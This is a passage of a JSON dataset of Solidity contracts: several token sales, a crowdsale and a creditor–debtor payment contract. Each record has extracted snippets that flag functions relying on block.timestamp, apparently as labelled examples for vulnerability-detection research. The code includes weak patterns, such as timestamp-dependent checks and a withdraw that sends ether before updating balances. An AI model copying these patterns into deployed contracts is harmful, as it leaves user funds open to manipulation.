  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract TokenOffering is StandardToken, Ownable, BurnableToken {\n bool public offeringEnabled;\n uint256 public currentTotalTokenOffering;\n uint256 public currentTokenOfferingRaised;\n uint256 public bonusRateOneEth;\n uint256 public startTime;\n uint256 public endTime;\n bool public isBurnInClose = false;\n bool public isOfferingStarted = false;\n event OfferingOpens(uint256 startTime, uint256 endTime, uint256 totalTokenOffering, uint256 bonusRateOneEth);\n event OfferingCloses(uint256 endTime, uint256 tokenOfferingRaised);\n function setBonusRate(uint256 _bonusRateOneEth) public onlyOwner {\n bonusRateOneEth = _bonusRateOneEth;\n }\n function preValidatePurchase(uint256 _amount) internal {\n require(_amount > 0);\n require(isOfferingStarted);\n require(offeringEnabled);\n require(currentTokenOfferingRaised.add(_amount) <= currentTotalTokenOffering);\n require(block.timestamp >= startTime && block.timestamp <= endTime);\n }\n function stopOffering() public onlyOwner {\n offeringEnabled = false;\n }\n function resumeOffering() public onlyOwner {\n offeringEnabled = true;\n }\n function startOffering(\n uint256 _tokenOffering,\n uint256 _bonusRateOneEth,\n uint256 _startTime,\n uint256 _endTime,\n bool _isBurnInClose\n ) public onlyOwner returns (bool) {\n require(_tokenOffering <= balances[owner]);\n require(_startTime <= _endTime);\n require(_startTime >= block.timestamp);\n require(!isOfferingStarted);\n isOfferingStarted = true;\n startTime = _startTime;\n endTime = _endTime;\n isBurnInClose = _isBurnInClose;\n currentTokenOfferingRaised = 0;\n currentTotalTokenOffering = _tokenOffering;\n offeringEnabled = true;\n setBonusRate(_bonusRateOneEth);\n emit OfferingOpens(startTime, endTime, currentTotalTokenOffering, bonusRateOneEth);\n return true;\n }\n function updateStartTime(uint256 _startTime) public onlyOwner {\n require(isOfferingStarted);\n require(_startTime <= endTime);\n require(_startTime >= block.timestamp);\n startTime = _startTime;\n }\n function updateEndTime(uint256 _endTime) public onlyOwner {\n require(isOfferingStarted);\n require(_endTime >= startTime);\n endTime = _endTime;\n }\n function updateBurnableStatus(bool _isBurnInClose) public onlyOwner {\n require(isOfferingStarted);\n isBurnInClose = _isBurnInClose;\n }\n function endOffering() public onlyOwner {\n if (isBurnInClose) {\n burnRemainTokenOffering();\n }\n emit OfferingCloses(endTime, currentTokenOfferingRaised);\n resetOfferingStatus();\n }\n function burnRemainTokenOffering() internal {\n if (currentTokenOfferingRaised < currentTotalTokenOffering) {\n uint256 remainTokenOffering = currentTotalTokenOffering.sub(currentTokenOfferingRaised);\n _burn(owner, remainTokenOffering);\n }\n }\n function resetOfferingStatus() internal {\n isOfferingStarted = false;\n startTime = 0;\n endTime = 0;\n currentTotalTokenOffering = 0;\n currentTokenOfferingRaised = 0;\n bonusRateOneEth = 0;\n offeringEnabled = false;\n isBurnInClose = false;\n }\n}\ncontract WithdrawTrack is StandardToken, Ownable {\n struct TrackInfo {\n address to;\n uint256 amountToken;\n string withdrawId;\n }\n mapping(string => TrackInfo) withdrawTracks;\n function withdrawToken(address _to, uint256 _amountToken, string _withdrawId) public onlyOwner returns (bool) {\n bool result = transfer(_to, _amountToken);\n if (result) {\n withdrawTracks[_withdrawId] = TrackInfo(_to, _amountToken, _withdrawId);\n }\n return result;\n }\n function withdrawTrackOf(string _withdrawId) public view returns (address to, uint256 amountToken) {\n TrackInfo track = withdrawTracks[_withdrawId];\n return (track.to, track.amountToken);\n }\n}\ncontract ContractSpendToken is StandardToken, Ownable {\n mapping (address => address) private contractToReceiver;\n function addContract(address _contractAdd, address _to) external onlyOwner returns (bool) {\n require(_contractAdd != address(0x0));\n require(_to != address(0x0));\n contractToReceiver[_contractAdd] = _to;\n return true;\n }\n function removeContract(address _contractAdd) external onlyOwner returns (bool) {\n contractToReceiver[_contractAdd] = address(0x0);\n return true;\n }\n function contractSpend(address _from, uint256 _value) public returns (bool) {\n address _to = contractToReceiver[msg.sender];\n require(_to != address(0x0));\n require(_value <= balances[_from]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function getContractReceiver(address _contractAdd) public view onlyOwner returns (address) {\n return contractToReceiver[_contractAdd];\n }\n}\ncontract ContractiumToken is TokenOffering, WithdrawTrack, ContractSpendToken {\n string public constant name = \"Contractium\";\n string public constant symbol = \"CTU\";\n uint8 public constant decimals = 18;\n uint256 public constant INITIAL_SUPPLY = 3000000000 * (10 ** uint256(decimals));\n uint256 public unitsOneEthCanBuy = 15000;\n uint256 internal totalWeiRaised;\n event BuyToken(address from, uint256 weiAmount, uint256 tokenAmount);\n function ContractiumToken() public {\n totalSupply_ = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function() public payable {\n require(msg.sender != owner);\n uint256 amount = msg.value.mul(unitsOneEthCanBuy);\n uint256 amountBonus = msg.value.mul(bonusRateOneEth);\n amount = amount.add(amountBonus);\n preValidatePurchase(amount);\n require(balances[owner] >= amount);\n totalWeiRaised = totalWeiRaised.add(msg.value);\n currentTokenOfferingRaised = currentTokenOfferingRaised.add(amount);\n balances[owner] = balances[owner].sub(amount);\n balances[msg.sender] = balances[msg.sender].add(amount);\n emit Transfer(owner, msg.sender, amount);\n emit BuyToken(msg.sender, msg.value, amount);\n owner.transfer(msg.value);\n }\n function batchTransfer(address[] _receivers, uint256[] _amounts) public returns(bool) {\n uint256 cnt = _receivers.length;\n require(cnt > 0 && cnt <= 20);\n require(cnt == _amounts.length);\n cnt = (uint8)(cnt);\n uint256 totalAmount = 0;\n for (uint8 i = 0; i < cnt; i++) {\n totalAmount = totalAmount.add(_amounts[i]);\n }\n require(totalAmount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(totalAmount);\n for (i = 0; i < cnt; i++) {\n balances[_receivers[i]] = balances[_receivers[i]].add(_amounts[i]);\n emit Transfer(msg.sender, _receivers[i], _amounts[i]);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function preValidatePurchase(uint256 _amount) internal {\nrequire(_amount > 0);\nrequire(isOfferingStarted);\nrequire(offeringEnabled);\nrequire(currentTokenOfferingRaised.add(_amount) <= currentTotalTokenOffering);\nrequire(block.timestamp >= startTime && block.timestamp <= endTime);\n}",
    "function updateStartTime(uint256 _startTime) public onlyOwner {\nrequire(isOfferingStarted);\nrequire(_startTime <= endTime);\nrequire(_startTime >= block.timestamp);\nstartTime = _startTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6e"
  },
  "filename": "883.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n}\ncontract RakuRakuEth {\n using SafeMath for uint256;\n enum Status {\n Pending,\n Requested,\n Canceled,\n Paid,\n Rejected\n }\n struct Payment {\n uint256 amountJpy;\n uint256 amountWei;\n uint256 rateEthJpy;\n uint256 paymentDue;\n uint256 requestedTime;\n Status status;\n }\n address public owner;\n address public creditor;\n address public debtor;\n uint256 ethWei = 10**18;\n Payment[] payments;\n mapping (address => uint256) balances;\n modifier onlyCreditor() {\n require(msg.sender == creditor);\n _;\n }\n modifier onlyDebtor() {\n require(msg.sender == debtor);\n _;\n }\n modifier onlyStakeholders() {\n require(msg.sender == debtor || msg.sender == creditor);\n _;\n }\n constructor (address _creditor, address _debtor) public {\n owner = msg.sender;\n creditor = _creditor;\n debtor = _debtor;\n }\n function getCurrentTimestamp () external view returns (uint256 timestamp) {\n return block.timestamp;\n }\n function collectPayment(uint256 _index) external returns (bool) {\n require(payments[_index].status == Status.Requested);\n require(payments[_index].requestedTime + 24*60*60 < block.timestamp);\n require(balances[debtor] >= payments[_index].amountWei);\n balances[debtor] = balances[debtor].sub(payments[_index].amountWei);\n balances[creditor] = balances[creditor].add(payments[_index].amountWei);\n payments[_index].status = Status.Paid;\n return true;\n }\n function getBalance(address _address) external view returns (uint256 balance) {\n return balances[_address];\n }\n function getPayment(uint256 _index) external view returns (uint256 amountJpy, uint256 amountWei, uint256 rateEthJpy, uint256 paymentDue, uint256 requestedTime, Status status) {\n Payment memory pm = payments[_index];\n return (pm.amountJpy, pm.amountWei, pm.rateEthJpy, pm.paymentDue, pm.requestedTime, pm.status);\n }\n function getNumPayments() external view returns (uint256 num) {\n return payments.length;\n }\n function withdraw(uint256 _amount) external returns (bool) {\n require(balances[msg.sender] >= _amount);\n msg.sender.transfer(_amount);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n return true;\n }\n function addPayment(uint256 _amountJpy, uint256 _paymentDue) external onlyCreditor returns (uint256 index) {\n payments.push(Payment(_amountJpy, 0, 0, _paymentDue, 0, Status.Pending));\n return payments.length-1;\n }\n function requestPayment(uint256 _index, uint256 _rateEthJpy) external onlyCreditor returns (bool) {\n require(payments[_index].status == Status.Pending || payments[_index].status == Status.Rejected);\n require(payments[_index].paymentDue <= block.timestamp);\n payments[_index].rateEthJpy = _rateEthJpy;\n payments[_index].amountWei = payments[_index].amountJpy.mul(ethWei).div(_rateEthJpy);\n payments[_index].requestedTime = block.timestamp;\n payments[_index].status = Status.Requested;\n return true;\n }\n function cancelPayment(uint256 _index) external onlyCreditor returns (bool) {\n require(payments[_index].status != Status.Paid);\n payments[_index].status = Status.Canceled;\n return true;\n }\n function () external payable onlyDebtor {\n balances[msg.sender] = balances[msg.sender].add(msg.value);\n }\n function rejectPayment(uint256 _index) external onlyDebtor returns (bool) {\n require(payments[_index].status == Status.Requested);\n require(payments[_index].requestedTime + 24*60*60 > block.timestamp);\n payments[_index].status = Status.Rejected;\n return true;\n }\n function approvePayment(uint256 _index) external onlyDebtor returns (bool) {\n require(payments[_index].status == Status.Requested);\n require(balances[debtor] >= payments[_index].amountWei);\n balances[debtor] = balances[debtor].sub(payments[_index].amountWei);\n balances[creditor] = balances[creditor].add(payments[_index].amountWei);\n payments[_index].status = Status.Paid;\n return true;\n }\n}",
  "extract_feature": [
    "function getCurrentTimestamp () external view returns (uint256 timestamp) {\nreturn block.timestamp;\n}",
    "function collectPayment(uint256 _index) external returns (bool) {\nrequire(payments[_index].status == Status.Requested);\nrequire(payments[_index].requestedTime + 24*60*60 < block.timestamp);\nrequire(balances[debtor] >= payments[_index].amountWei);\nbalances[debtor] = balances[debtor].sub(payments[_index].amountWei);\nbalances[creditor] = balances[creditor].add(payments[_index].amountWei);\npayments[_index].status = Status.Paid;\nreturn true;\n}",
    "function requestPayment(uint256 _index, uint256 _rateEthJpy) external onlyCreditor returns (bool) {\nrequire(payments[_index].status == Status.Pending || payments[_index].status == Status.Rejected);\nrequire(payments[_index].paymentDue <= block.timestamp);\npayments[_index].rateEthJpy = _rateEthJpy;\npayments[_index].amountWei = payments[_index].amountJpy.mul(ethWei).div(_rateEthJpy);\npayments[_index].requestedTime = block.timestamp;\npayments[_index].status = Status.Requested;\nreturn true;\n}",
    "function rejectPayment(uint256 _index) external onlyDebtor returns (bool) {\nrequire(payments[_index].status == Status.Requested);\nrequire(payments[_index].requestedTime + 24*60*60 > block.timestamp);\npayments[_index].status = Status.Rejected;\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f6f"
  },
  "filename": "8851.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n function allowance(address owner, address spender) public view returns (uint256);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract mameCoin is ERC20, Ownable {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) internal allowed;\n mapping(address => uint256) internal lockups;\n string public constant name = \"mameCoin\";\n string public constant symbol = \"MAME\";\n uint8 public constant decimals = 8;\n uint256 totalSupply_ = 25000000000 * (10 ** uint256(decimals));\n event Burn(address indexed to, uint256 amount);\n event Refund(address indexed to, uint256 amount);\n event Lockup(address indexed to, uint256 lockuptime);\n constructor() public {\n balances[msg.sender] = totalSupply_;\n emit Transfer(address(0), msg.sender, totalSupply_);\n }\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) public returns (bool) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n require(block.timestamp > lockups[msg.sender]);\n require(block.timestamp > lockups[_to]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool) {\n require(_to != address(0));\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n require(block.timestamp > lockups[_from]);\n require(block.timestamp > lockups[_to]);\n balances[_from] = balances[_from].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n emit Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _amount) public returns (bool) {\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function burn(address _to, uint256 _amount) public onlyOwner {\n require(_amount <= balances[_to]);\n require(block.timestamp > lockups[_to]);\n balances[_to] = balances[_to].sub(_amount);\n totalSupply_ = totalSupply_.sub(_amount);\n emit Burn(_to, _amount);\n emit Transfer(_to, address(0), _amount);\n }\n function refund(address _to, uint256 _amount) public onlyOwner {\n require(block.timestamp > lockups[_to]);\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Refund(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n }\n function lockupOf(address _owner) public view returns (uint256) {\n return lockups[_owner];\n }\n function lockup(address _to, uint256 _lockupTimeUntil) public onlyOwner {\n require(lockups[_to] < _lockupTimeUntil);\n lockups[_to] = _lockupTimeUntil;\n emit Lockup(_to, _lockupTimeUntil);\n }\n function airdrop(address[] _receivers, uint256 _amount) public returns (bool) {\n require(block.timestamp > lockups[msg.sender]);\n require(_receivers.length > 0);\n require(_amount > 0);\n uint256 _total = 0;\n for (uint256 i = 0; i < _receivers.length; i++) {\n require(_receivers[i] != address(0));\n require(block.timestamp > lockups[_receivers[i]]);\n _total = _total.add(_amount);\n }\n require(_total <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_total);\n for (i = 0; i < _receivers.length; i++) {\n balances[_receivers[i]] = balances[_receivers[i]].add(_amount);\n emit Transfer(msg.sender, _receivers[i], _amount);\n }\n return true;\n }\n function distribute(address[] _receivers, uint256[] _amounts) public returns (bool) {\n require(block.timestamp > lockups[msg.sender]);\n require(_receivers.length > 0);\n require(_amounts.length > 0);\n require(_receivers.length == _amounts.length);\n uint256 _total = 0;\n for (uint256 i = 0; i < _receivers.length; i++) {\n require(_receivers[i] != address(0));\n require(block.timestamp > lockups[_receivers[i]]);\n require(_amounts[i] > 0);\n _total = _total.add(_amounts[i]);\n }\n require(_total <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_total);\n for (i = 0; i < _receivers.length; i++) {\n balances[_receivers[i]] = balances[_receivers[i]].add(_amounts[i]);\n emit Transfer(msg.sender, _receivers[i], _amounts[i]);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _amount) public returns (bool) {\nrequire(_to != address(0));\nrequire(_amount <= balances[msg.sender]);\nrequire(block.timestamp > lockups[msg.sender]);\nrequire(block.timestamp > lockups[_to]);\nbalances[msg.sender] = balances[msg.sender].sub(_amount);\nbalances[_to] = balances[_to].add(_amount);\nemit Transfer(msg.sender, _to, _amount);\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _amount) public returns (bool) {\nrequire(_to != address(0));\nrequire(_amount <= balances[_from]);\nrequire(_amount <= allowed[_from][msg.sender]);\nrequire(block.timestamp > lockups[_from]);\nrequire(block.timestamp > lockups[_to]);\nbalances[_from] = balances[_from].sub(_amount);\nbalances[_to] = balances[_to].add(_amount);\nallowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\nemit Transfer(_from, _to, _amount);\nreturn true;\n}",
    "function burn(address _to, uint256 _amount) public onlyOwner {\nrequire(_amount <= balances[_to]);\nrequire(block.timestamp > lockups[_to]);\nbalances[_to] = balances[_to].sub(_amount);\ntotalSupply_ = totalSupply_.sub(_amount);\nemit Burn(_to, _amount);\nemit Transfer(_to, address(0), _amount);\n}",
    "function refund(address _to, uint256 _amount) public onlyOwner {\nrequire(block.timestamp > lockups[_to]);\ntotalSupply_ = totalSupply_.add(_amount);\nbalances[_to] = balances[_to].add(_amount);\nemit Refund(_to, _amount);\nemit Transfer(address(0), _to, _amount);\n}",
    "function airdrop(address[] _receivers, uint256 _amount) public returns (bool) {\nrequire(block.timestamp > lockups[msg.sender]);\nrequire(_receivers.length > 0);\nrequire(_amount > 0);\nuint256 _total = 0;\nfor (uint256 i = 0; i < _receivers.length; i++) {\nrequire(_receivers[i] != address(0));\nrequire(block.timestamp > lockups[_receivers[i]]);\n_total = _total.add(_amount);\n}\nrequire(_total <= balances[msg.sender]);\nbalances[msg.sender] = balances[msg.sender].sub(_total);\nfor (i = 0; i < _receivers.length; i++) {\nbalances[_receivers[i]] = balances[_receivers[i]].add(_amount);\nemit Transfer(msg.sender, _receivers[i], _amount);\n}\nreturn true;\n}",
    "function distribute(address[] _receivers, uint256[] _amounts) public returns (bool) {\nrequire(block.timestamp > lockups[msg.sender]);\nrequire(_receivers.length > 0);\nrequire(_amounts.length > 0);\nrequire(_receivers.length == _amounts.length);\nuint256 _total = 0;\nfor (uint256 i = 0; i < _receivers.length; i++) {\nrequire(_receivers[i] != address(0));\nrequire(block.timestamp > lockups[_receivers[i]]);\nrequire(_amounts[i] > 0);\n_total = _total.add(_amounts[i]);\n}\nrequire(_total <= balances[msg.sender]);\nbalances[msg.sender] = balances[msg.sender].sub(_total);\nfor (i = 0; i < _receivers.length; i++) {\nbalances[_receivers[i]] = balances[_receivers[i]].add(_amounts[i]);\nemit Transfer(msg.sender, _receivers[i], _amounts[i]);\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f70"
  },
  "filename": "9208.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) revert();\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) revert();\n _;\n }\n modifier onlyInEmergency {\n if (!halted) revert();\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy is Ownable {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\ncontract Crowdsale is Haltable {\n uint public constant TIME_PERIOD_IN_SEC = 1 days;\n uint public baseEthCap;\n uint public maxEthPerAddress;\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMath for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint256 public tokensSold = 0;\n uint256 public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint256 weiAmount, uint256 tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event EndsAtChanged(uint newEndsAt);\n event BaseEthCapChanged(uint newBaseEthCap);\n event MaxEthPerAddressChanged(uint newMaxEthPerAddress);\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _baseEthCap, uint _maxEthPerAddress) {\n owner = msg.sender;\n baseEthCap = _baseEthCap;\n maxEthPerAddress = _maxEthPerAddress;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if (multisigWallet == 0) {\n revert();\n }\n if (_start == 0) {\n revert();\n }\n startsAt = _start;\n if (_end == 0) {\n revert();\n }\n endsAt = _end;\n if (startsAt >= endsAt) {\n revert();\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function() payable {\n buy();\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n if (tokenAmount == 0) {\n revert();\n }\n uint currentFgcCap = getCurrentFgcCap();\n if (tokenAmount > currentFgcCap) {\n revert();\n }\n if (investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);\n weiRaised = weiRaised.add(weiAmount);\n tokensSold = tokensSold.add(tokenAmount);\n if (pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.add(weiAmount);\n }\n if (isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n revert();\n }\n assignTokens(receiver, tokenAmount);\n if (!multisigWallet.send(weiAmount))\n revert();\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function getCurrentFgcCap() public constant returns (uint) {\n if (block.timestamp < startsAt)\n return maxEthPerAddress;\n uint timeSinceStart = block.timestamp.sub(startsAt);\n uint currentPeriod = timeSinceStart.div(TIME_PERIOD_IN_SEC).add(1);\n if (currentPeriod < 2) {\n return 5000 * 10**token.decimals();\n }\n if (currentPeriod > 2 && currentPeriod < 5) {\n return 1000 * 10**token.decimals();\n }\n if (currentPeriod > 4 && currentPeriod < 6) {\n return 500 * 10**token.decimals();\n }\n if (currentPeriod > 5 && currentPeriod < 9) {\n return 200 * 10**token.decimals();\n }\n if (currentPeriod > 8 && currentPeriod < 11) {\n return 100 * 10**token.decimals();\n }\n return maxEthPerAddress;\n }\n function preallocate(address receiver, uint256 fullTokens, uint256 weiPrice) public onlyOwner {\n uint256 tokenAmount = fullTokens;\n uint256 weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.add(weiAmount);\n tokensSold = tokensSold.add(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, 